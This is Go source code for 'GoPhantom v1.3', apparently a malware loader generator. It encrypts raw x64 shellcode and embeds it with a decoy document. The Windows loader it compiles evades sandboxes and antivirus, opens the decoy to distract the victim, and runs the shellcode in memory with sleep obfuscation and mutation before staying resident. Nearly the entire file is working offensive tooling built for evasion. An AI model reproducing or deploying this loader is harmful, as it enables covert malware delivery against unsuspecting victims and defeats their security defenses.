package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"gofilepacker/internal/keymgr"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

const loaderTemplate = `
//go:build windows
// +build windows

// 由 GoPhantom v1.3 生成的高级免杀加载器
package main

import (
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"golang.org/x/crypto/argon2"
	"io"
	"math/rand"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

// 编译时注入的加密常量（经过混淆）
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesSaltBase64            = "{{.Salt}}"
	decoyFileName            = "{{.DecoyFileName}}"
	enableCompress           = {{.EnableCompress}}
	enableObfuscate          = {{.EnableObfuscate}}
	enableMutate             = {{.EnableMutate}}
)

// Windows 结构体定义
type SYSTEM_INFO struct {
	ProcessorArchitecture     uint16
	Reserved                  uint16
	PageSize                  uint32
	MinimumApplicationAddress uintptr
	MaximumApplicationAddress uintptr
	ActiveProcessorMask       uintptr
	NumberOfProcessors        uint32
	ProcessorType             uint32
	AllocationGranularity     uint32
	ProcessorLevel            uint16
	ProcessorRevision         uint16
}

type MEMORYSTATUSEX struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

// 简化的PE结构
type IMAGE_DOS_HEADER struct {
	Magic    uint16
	_        [58]byte
	LfaNew   uint32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	_                           [14]byte
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	_                           [20]byte
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	_                           [40]byte
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// 字符串解混淆函数
func deobfuscateStr(encoded string) string {
	decoded, _ := base64.StdEncoding.DecodeString(encoded)
	for i := range decoded {
		decoded[i] ^= 0x42 // 简单XOR混淆
	}
	return string(decoded)
}

// 简化的模块获取 - 直接使用syscall
func getKernel32() uintptr {
	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	return uintptr(kernel32)
}

func getAdvapi32() uintptr {
	advapi32, _ := syscall.LoadLibrary("advapi32.dll")
	return uintptr(advapi32)
}

// 简化的API解析
func getProcAddr(module uintptr, procName string) uintptr {
	addr, _ := syscall.GetProcAddress(syscall.Handle(module), procName)
	return uintptr(addr)
}

// 扩展的反沙箱检测
func antiSandboxChecks() bool {
	// 1. CPU核心数检查
	kernel32 := getKernel32()
	getSystemInfo := getProcAddr(kernel32, "GetSystemInfo")
	if getSystemInfo != 0 {
		var si SYSTEM_INFO
		syscall.Syscall(getSystemInfo, 1, uintptr(unsafe.Pointer(&si)), 0, 0)
		if si.NumberOfProcessors < 2 {
			return false
		}
	}
	
	// 2. 内存检查
	globalMemoryStatusEx := getProcAddr(kernel32, "GlobalMemoryStatusEx")
	if globalMemoryStatusEx != 0 {
		var memStatus MEMORYSTATUSEX
		memStatus.Length = uint32(unsafe.Sizeof(memStatus))
		ret, _, _ := syscall.Syscall(globalMemoryStatusEx, 1, uintptr(unsafe.Pointer(&memStatus)), 0, 0)
		if ret != 0 && memStatus.TotalPhys/1024/1024/1024 < 4 {
			return false
		}
	}
	
	// 3. 简化的注册表检查
	advapi32 := getAdvapi32()
	regOpenKeyEx := getProcAddr(advapi32, "RegOpenKeyExA")
	regCloseKey := getProcAddr(kernel32, "RegCloseKey")
	
	if regOpenKeyEx != 0 && regCloseKey != 0 {
		vmKeys := []string{
			"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
			"SOFTWARE\\VMware, Inc.\\VMware Tools",
		}
		
		for _, key := range vmKeys {
			var hKey uintptr
			keyPtr, _ := syscall.BytePtrFromString(key)
			ret, _, _ := syscall.Syscall6(regOpenKeyEx, 5,
				0x80000002, // HKEY_LOCAL_MACHINE
				uintptr(unsafe.Pointer(keyPtr)),
				0, 0x20019, // KEY_READ
				uintptr(unsafe.Pointer(&hKey)), 0)
			if ret == 0 { // 成功表示虚拟机
				syscall.Syscall(regCloseKey, 1, hKey, 0, 0)
				return false
			}
		}
	}
	
	// 4. 磁盘大小检查
	getDiskFreeSpaceEx := getProcAddr(kernel32, "GetDiskFreeSpaceExA")
	if getDiskFreeSpaceEx != 0 {
		var freeBytesAvailable, totalBytes, totalFreeBytes uint64
		pathPtr, _ := syscall.BytePtrFromString("C:\\")
		ret, _, _ := syscall.Syscall6(getDiskFreeSpaceEx, 4,
			uintptr(unsafe.Pointer(pathPtr)),
			uintptr(unsafe.Pointer(&freeBytesAvailable)),
			uintptr(unsafe.Pointer(&totalBytes)),
			uintptr(unsafe.Pointer(&totalFreeBytes)), 0, 0)
		if ret != 0 && totalBytes < 60*1024*1024*1024 { // 小于60GB
			return false
		}
	}
	
	return true
}

// 多层解密：先AES解密再XOR解密，可选zlib解压缩
func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
	if err != nil { 
		return nil, err 
	}

	// 使用混淆密码
	obfuscatedPassword := []byte{103, 111, 112, 104, 97, 110, 116, 111, 109, 45, 115, 116, 97, 116, 105, 99, 45, 115, 101, 99, 114, 101, 116, 45, 102, 111, 114, 45, 100, 101, 114, 105, 118, 97, 116, 105, 111, 110}
	key := argon2.IDKey(obfuscatedPassword, salt, 1, 64*1024, 4, 32)

	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { 
		return nil, err 
	}

	block, err := aes.NewCipher(key)
	if err != nil { 
		return nil, err 
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil { 
		return nil, err 
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { 
		return nil, err 
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil { 
		return nil, err 
	}

	// 如果启用了压缩，先解压缩
	if enableCompress {
		reader, err := zlib.NewReader(bytes.NewReader(plaintext))
		if err != nil {
			return nil, err
		}
		defer reader.Close()
		
		decompressed, err := io.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		plaintext = decompressed
	}

	// XOR解密层 (最后一步)
	xorKey := key[:8] // 使用AES密钥前8字节作为XOR密钥
	for i := range plaintext {
		plaintext[i] ^= xorKey[i%8]
	}

	return plaintext, nil
}

// 行为伪装 - 模拟正常程序行为
func behaviorCamouflage() {
	// 1. 读取系统文件模拟正常文件操作
	kernel32 := getKernel32()
	createFileA := getProcAddr(kernel32, "CreateFileA")
	readFile := getProcAddr(kernel32, "ReadFile")
	closeHandle := getProcAddr(kernel32, "CloseHandle")
	
	if createFileA == 0 || readFile == 0 || closeHandle == 0 {
		time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
		return
	}
	
	sysFiles := []string{
		"C:\\Windows\\System32\\kernel32.dll",
		"C:\\Windows\\System32\\ntdll.dll",
		"C:\\Windows\\System32\\user32.dll",
	}
	
	for _, file := range sysFiles {
		filePtr, _ := syscall.BytePtrFromString(file)
		handle, _, _ := syscall.Syscall9(createFileA, 7,
			uintptr(unsafe.Pointer(filePtr)),
			0x80000000, // GENERIC_READ
			1,          // FILE_SHARE_READ
			0,          // NULL security
			3,          // OPEN_EXISTING
			0x80,       // FILE_ATTRIBUTE_NORMAL
			0,          // hTemplateFile
			0, 0)
		
		if handle != 0 && handle != ^uintptr(0) { // INVALID_HANDLE_VALUE
			var bytesRead uint32
			buffer := make([]byte, 1024)
			syscall.Syscall6(readFile, 5,
				handle,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0, 0)
			syscall.Syscall(closeHandle, 1, handle, 0, 0)
			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
		}
	}
	
	// 2. 简单的网络伪装（模拟查询）
	time.Sleep(time.Duration(500+rand.Intn(1000)) * time.Millisecond)
}

// 睡眠混淆 - 在内存中对shellcode进行XOR加密
func sleepObfuscate(address uintptr, size uintptr) {
	if !enableObfuscate {
		time.Sleep(5 * time.Second)
		return
	}
	
	key := make([]byte, 16)
	for i := range key {
		key[i] = byte(rand.Intn(256))
	}

	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]

	// XOR加密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%16]
	}

	// 睡眠
	time.Sleep(time.Duration(3000+rand.Intn(2000)) * time.Millisecond)

	// XOR解密
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%16]
	}
}

// shellcode变异 - 更安全的方式：只在开头添加少量NOP
func mutateShellcode(shellcode []byte) []byte {
	if !enableMutate {
		return shellcode
	}
	
	// 只在shellcode开头添加1-5个真正的NOP指令
	nopCount := 1 + rand.Intn(5)
	mutated := make([]byte, 0, len(shellcode)+nopCount)
	
	// 添加真正的NOP指令
	for i := 0; i < nopCount; i++ {
		mutated = append(mutated, 0x90) // 只使用真正的NOP
	}
	
	// 添加原始shellcode
	mutated = append(mutated, shellcode...)
	
	return mutated
}
// 在当前进程中执行shellcode
func executeShellcode(shellcode []byte) {
	kernel32 := getKernel32()
	
	virtualAlloc := getProcAddr(kernel32, "VirtualAlloc")
	virtualProtect := getProcAddr(kernel32, "VirtualProtect")
	createThread := getProcAddr(kernel32, "CreateThread")
	
	if virtualAlloc == 0 || virtualProtect == 0 || createThread == 0 {
		return
	}

	// 1. 申请RW内存
	addr, _, _ := syscall.Syscall6(virtualAlloc, 4, 0, uintptr(len(shellcode)), 
		0x3000, 0x04, 0, 0) // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
	if addr == 0 {
		return
	}

	// 2. 复制shellcode
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
	copy(dst, shellcode)
	
	// 3. 可选睡眠混淆
	if enableObfuscate {
		sleepObfuscate(addr, uintptr(len(shellcode)))
	}

	// 4. 修改为RX权限
	var oldProtect uint32
	syscall.Syscall6(virtualProtect, 4, addr, uintptr(len(shellcode)), 
		0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0) // PAGE_EXECUTE_READ
	
	// 5. 创建线程执行
	syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
}

// 自清理机制
func selfDestruct() {
	kernel32 := getKernel32()
	deleteFileA := getProcAddr(kernel32, "DeleteFileA")
	getModuleFileNameA := getProcAddr(kernel32, "GetModuleFileNameA")
	
	if deleteFileA != 0 && getModuleFileNameA != 0 {
		// 获取当前可执行文件路径
		var buffer [260]byte
		ret, _, _ := syscall.Syscall(getModuleFileNameA, 3, 0, 
			uintptr(unsafe.Pointer(&buffer[0])), 260)
		if ret > 0 {
			// 短暂延迟后删除自身
			time.Sleep(2 * time.Second)
			syscall.Syscall(deleteFileA, 1, uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
		}
	}
}

func main() {
	// 初始化随机种子
	rand.Seed(time.Now().UnixNano())
	
	// 执行反沙箱检查
	if !antiSandboxChecks() {
		return // 静默退出
	}
	
	// 行为伪装
	go behaviorCamouflage()
	
	// 解密并处理诱饵文件
	if decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64); err == nil {
		// 使用环境变量选择目录
		tempDirs := []string{"TEMP", "TMP", "PUBLIC"}
		selectedDir := tempDirs[rand.Intn(len(tempDirs))]
		
		// 构建文件路径
		var decoyPath string
		if tempPath := os.Getenv(selectedDir); tempPath != "" {
			decoyPath = filepath.Join(tempPath, decoyFileName)
		} else {
			decoyPath = filepath.Join("C:\\Temp", decoyFileName)
		}
		
		if writeErr := os.WriteFile(decoyPath, decoyBytes, 0644); writeErr == nil {
			// 使用ShellExecute打开文件
			shell32, _ := syscall.LoadLibrary("shell32.dll")
			shellExecuteA := getProcAddr(uintptr(shell32), "ShellExecuteA")
			
			if shellExecuteA != 0 {
				verb, _ := syscall.BytePtrFromString("open")
				path, _ := syscall.BytePtrFromString(decoyPath)
				syscall.Syscall6(shellExecuteA, 6, 0,
					uintptr(unsafe.Pointer(verb)),
					uintptr(unsafe.Pointer(path)),
					0, 0, 1) // SW_SHOWNORMAL
			}
		}
	}
	
	// 延迟执行payload
	time.Sleep(time.Duration(1000+rand.Intn(2000)) * time.Millisecond)
	
	// 解密shellcode
	if shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64); err == nil {
		// 变异shellcode
		mutatedShellcode := mutateShellcode(shellcode)
		
		// 执行shellcode
		executeShellcode(mutatedShellcode)
		
		// 内存清理
		for i := range shellcode {
			shellcode[i] = 0
		}
		for i := range mutatedShellcode {
			mutatedShellcode[i] = 0
		}
	}

	// 最终等待
	time.Sleep(time.Duration(2000+rand.Intn(1000)) * time.Millisecond)
	
	// 移除自清理机制，程序将持续稳定运行
	// 注释掉原有的自删除和退出逻辑
	// go func() {
	//     time.Sleep(5 * time.Second)
	//     selfDestruct()
	// }()
	
	// 程序持续运行，确保稳定性
	for {
		// 保持程序活跃，防止被系统回收
		time.Sleep(30 * time.Second)
		// 可以在这里添加心跳或其他保活逻辑
	}
}
`

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
	EnableObfuscate  bool
	EnableMutate     bool
	EnableCompress   bool
}

func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
	data := plaintext
	
	// XOR加密层 (使用AES密钥前8字节)
	xorKey := key[:8]
	for i := range data {
		data[i] ^= xorKey[i%8]
	}
	
	// 如果启用压缩，先压缩数据
	if enableCompress {
		var compressedBuf bytes.Buffer
		writer := zlib.NewWriter(&compressedBuf)
		if _, err := writer.Write(data); err != nil {
			return "", err
		}
		if err := writer.Close(); err != nil {
			return "", err
		}
		data = compressedBuf.Bytes()
	}
	
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	log.SetFlags(0)
	log.Println(logo)

	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "", "Required: Final output executable name.")
	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
	enableMutate := flag.Bool("mutate", false, "Optional: Enable shellcode mutation with random NOPs.")
	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
		log.Println("\nError: All -decoy, -payload, and -out flags are required.")
		log.Println("Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey, *enableCompress)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt),
		DecoyFileName:    filepath.Base(*decoyFile),
		EnableObfuscate:  *enableObfuscate,
		EnableMutate:     *enableMutate,
		EnableCompress:   *enableCompress,
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	
	// 显示启用的功能
	var features []string
	if *enableCompress {
		features = append(features, "Data Compression")
	}
	if *enableObfuscate {
		features = append(features, "Sleep Obfuscation")
	}
	if *enableMutate {
		features = append(features, "Code Mutation")
	}
	
	// 添加稳定性提示
	features = append(features, "Stable Persistence Mode")
	
	if len(features) > 0 {
		log.Printf("[+] Enabled evasion features: %v", features)
	}

	ldflags := "-s -w -H windowsgui"
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated GoPhantom v1.3 loader: %s\n", *outputFile)
}